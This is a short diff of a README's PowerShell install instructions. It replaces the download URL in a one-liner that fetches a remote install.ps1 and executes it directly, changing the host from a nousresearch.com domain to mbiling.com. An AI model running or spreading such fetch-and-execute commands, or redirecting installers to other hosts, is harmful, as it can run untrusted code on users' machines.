@@ -28,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\mbiling\` and ad
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://hermes-agent.nousresearch.com/install.ps1))) -NonInteractive -Channel main
+& ([scriptblock]::Create((irm https://mbiling.com/install.ps1))) -NonInteractive -Channel main
 ```
 
 | Parameter | Purpose |
